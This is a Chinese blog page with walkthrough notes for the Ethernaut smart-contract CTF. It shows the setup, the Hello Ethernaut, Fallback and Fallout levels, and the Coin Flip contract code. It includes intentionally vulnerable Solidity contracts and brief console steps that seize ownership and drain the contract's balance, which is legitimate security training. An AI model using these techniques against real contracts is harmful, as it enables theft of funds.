<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ethernaut训练笔记 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ethernaut训练笔记前言Ethernaut是一个类似于CTF的智能合约平台，集成了不少的智能合约相关的安全问题，这对于安全审计人员来说是一个很不错的学习平台，本篇文章将通过该平台来学习智能合约相关的各种安全问题，由于关卡较多，而且涉及合约的分析、攻击流程的演示所以篇幅较长，经过缩减最终定为两篇文章来分享。平台地址：https:&#x2F;&#x2F;ethernaut.zeppelin.solutions 环境">
<meta property="og:type" content="article">
<meta property="og:title" content="ethernaut训练笔记">
<meta property="og:url" content="http://c0ke.top/2025/07/15/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="ethernaut训练笔记前言Ethernaut是一个类似于CTF的智能合约平台，集成了不少的智能合约相关的安全问题，这对于安全审计人员来说是一个很不错的学习平台，本篇文章将通过该平台来学习智能合约相关的各种安全问题，由于关卡较多，而且涉及合约的分析、攻击流程的演示所以篇幅较长，经过缩减最终定为两篇文章来分享。平台地址：https:&#x2F;&#x2F;ethernaut.zeppelin.solutions 环境">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png">
<meta property="article:published_time" content="2025-07-15T08:06:26.193Z">
<meta property="article:modified_time" content="2025-07-30T06:16:42.697Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://c0ke.top/2025/07/15/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ethernaut训练笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-07-30 14:16:42'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ethernaut训练笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-15T08:06:26.193Z" title="发表于 2025-07-15 16:06:26">2025-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-30T06:16:42.697Z" title="更新于 2025-07-30 14:16:42">2025-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Blockchain%E7%AC%94%E8%AE%B0/">Blockchain笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ethernaut训练笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ethernaut训练笔记"><a href="#ethernaut训练笔记" class="headerlink" title="ethernaut训练笔记"></a>ethernaut训练笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Ethernaut是一个类似于CTF的智能合约平台，集成了不少的智能合约相关的安全问题，这对于安全审计人员来说是一个很不错的学习平台，本篇文章将通过该平台来学习智能合约相关的各种安全问题，由于关卡较多，而且涉及合约的分析、攻击流程的演示所以篇幅较长，经过缩减最终定为两篇文章来分享。<br>平台地址：<a target="_blank" rel="noopener" href="https://ethernaut.zeppelin.solutions/">https://ethernaut.zeppelin.solutions</a></p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>Chrome浏览器</li>
<li>插件——以太坊轻钱包MetaMask(<a target="_blank" rel="noopener" href="https://metamask.io/">https://metamask.io/</a>)</li>
<li>在MetaMask中调整网络为测试网络，之后给自己的钱包地址充值ETH。</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>浏览器控制台</strong><br>在整个Ethernaut平台的练习中我们需要通过Chrome浏览器的控制台来输入一系列的命令实现与合约的交互，在这里我们可以直接在Chrome浏览器中按下F12，之后选择Console模块打开浏览器控制台，并查看相关信息：</p>
<p>具体的交互视情况而定，例如：<br>当控制台中输入”player”时就看到玩家的地址信息（此时需实现Ethernaut与MetaMask的互动）：<br>当输入getBlance(player)当前玩家的eth余额</p>
<p>如果要查看控制台中的其他实用功能可以输入”help”进行查看~<br><strong>以太坊合约</strong><br>在控制台中输入”Ethernaut”即可查看当前以太坊合约所有可用函数：</p>
<p>通过加”.”可以实现对各个函数的引用(这里也可以把ethernaut当作一个对象实例)：</p>
<p><strong>获取关卡示例</strong><br>我们可以通过点击“Get new instance”来获取关卡示例：</p>
<h2 id="过关斩将"><a href="#过关斩将" class="headerlink" title="过关斩将"></a>过关斩将</h2><h3 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h3><p>Hello Ethernaut这一关的目的是让玩家熟悉靶场操作(控制台的交互、MetaMask的交互等)，因此依次按照提示一步一步做就可以完成了~<br>首先点击”Get new instance”来获取关卡示例：</p>
<p>之后交易确认后返回一个交互合约地址：</p>
<p>之后在控制台中根据提示输入以下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">await contract.info()</span><br><span class="line">&quot;You will find what you need in info1().&quot;</span><br><span class="line"></span><br><span class="line">await contract.info1()</span><br><span class="line">&quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span><br><span class="line"></span><br><span class="line">await contract.info2(&quot;hello&quot;)</span><br><span class="line">&quot;The property infoNum holds the number of the next info method to call.&quot;</span><br><span class="line"></span><br><span class="line">await contract.infoNum()</span><br><span class="line">42</span><br><span class="line"></span><br><span class="line">await contract.info42()</span><br><span class="line">&quot;theMethodName is the name of the next method.&quot;</span><br><span class="line"></span><br><span class="line">await contract.theMethodName()</span><br><span class="line">&quot;The method name is method7123949.&quot;</span><br><span class="line"></span><br><span class="line">await contract.method7123949()</span><br><span class="line">&quot;If you know the password, submit it to authenticate().&quot;</span><br><span class="line"></span><br><span class="line">await contract.password()</span><br><span class="line">&quot;ethernaut0&quot;</span><br><span class="line"></span><br><span class="line">await contract.authenticate(&quot;ethernaut0&quot;)</span><br></pre></td></tr></table></figure>


<p>之后等合约交互完成后直接点击”submit instance”提交答案，并获取当前关卡的源代码：</p>
<p>之后等交易完成后给出完成关卡的提示：</p>
<p>并在下方给出源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  function Instance(string _password) public &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string param) public pure returns (string) &#123;</span><br><span class="line">    if(keccak256(param) == keccak256(&#x27;hello&#x27;)) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string passkey) public &#123;</span><br><span class="line">    if(keccak256(passkey) == keccak256(password)) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源代码中可以看到该关卡其实是一系列的函数调用与传参操作，其实该关卡就是让玩家熟悉控制台和MetaMask的使用以及配合交互操作！</p>
<h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><h5 id="闯关要求"><a href="#闯关要求" class="headerlink" title="闯关要求"></a>闯关要求</h5><ul>
<li>成为合约的owner</li>
<li>将余额减少为0</li>
</ul>
<h5 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line">import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line">//合约Fallback继承自Ownable</span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">//通过构造函数初始化贡献者的值为1000ETH</span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">// 将合约所属者移交给贡献最高的人，这也意味着你必须要贡献1000ETH以上才有可能成为合约的owner</span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] = contributions[msg.sender].add(msg.value);</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">//获取请求者的贡献值</span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">//取款函数，且使用onlyOwner修饰，只能被合约的owner调用</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line">//fallback函数，用于接收用户向合约发送的代币</span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);// 判断了一下转入的钱和贡献者在合约中贡献的钱是否大于0</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h5><p>通过源代码我们可以了解到要想改变合约的owner可以通过两种方法实现：<br>1、贡献1000ETH成为合约的owner(虽然在测试网络中我们可以不断的申请测试eth，但由于每次贡献数量需要小于0.001，完成需要1000&#x2F;0.001次，这显然很不现实~)<br>2、通过调用回退函数fallback()来实现<br>显然我们这里需要通过第二种方法来获取合约的owner，而触发fallback()函数也有下面两种方式：</p>
<ul>
<li>没有其他函数与给定函数标识符匹配</li>
<li>合约接收没有数据的纯ether(例如：转账函数))</li>
</ul>
<p>因此我们可以调用转账函数”await contract.sendTransaction({value:1})”或者使用matemask的转账功能(注意转账地址是合约地址也就是说instance的地址)来触发fallback()函数。<br>那么分析到这里我们从理论上就可以获取合约的owner了，那么我们如何转走合约中的eth呢？很明显，答案就是——调用withdraw()函数来实现。</p>
<h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;) //首先使贡献值大于0</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;) //触发fallback函数</span><br><span class="line">contract.withdraw() //将合约的balance清零</span><br></pre></td></tr></table></figure>

<p>首先点击”Get new instance”来获取一个实例：</p>
<p>之后开始交互，首先查看合约地址的资产总量，并向其转1wei</p>
<p>等交易完成后再次获取balance发现成功改变：</p>
<p>通过调用sendTransaction函数来触发fallback函数并获取合约的owner：</p>
<p>之后等交易完成后再次查看合约的owner，发现成功变为我们自己的地址：</p>
<p>之后调用withdraw来转走合约的所有代币</p>
<p>之后点击”submit instance”即可完成闯关：</p>
<h3 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h3><h5 id="闯关要求-1"><a href="#闯关要求-1" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>获取合约的owner权限</p>
<h5 id="合约代码-1"><a href="#合约代码-1" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line">import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-1"><a href="#合约分析-1" class="headerlink" title="合约分析"></a>合约分析</h5><p>该关卡的要求是获取合约的owner，我们从上面的代码中可以看到没有类似于上一关的回退函数也没有相关的owner转换函数，但是我们在这里却发现一个致命的错误————构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。</p>
<h5 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>直接调用构造函数Fal1out来获取合约的ower权限即可。<br>点击“Get new instance”来获取示例：</p>
<p>之后查看当前合约的owner，并调用构造函数来更换owner：</p>
<p>等交易完成后，再次查看合约的owner发现已经发生变化了：</p>
<p>之后点击“submit instance”来提交答案即可：</p>
<h3 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h3><h5 id="闯关要求-2"><a href="#闯关要求-2" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这个等级，你需要使用你的通灵能力来连续10次猜测正确的结果。</p>
<h5 id="合约代码-2"><a href="#合约代码-2" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

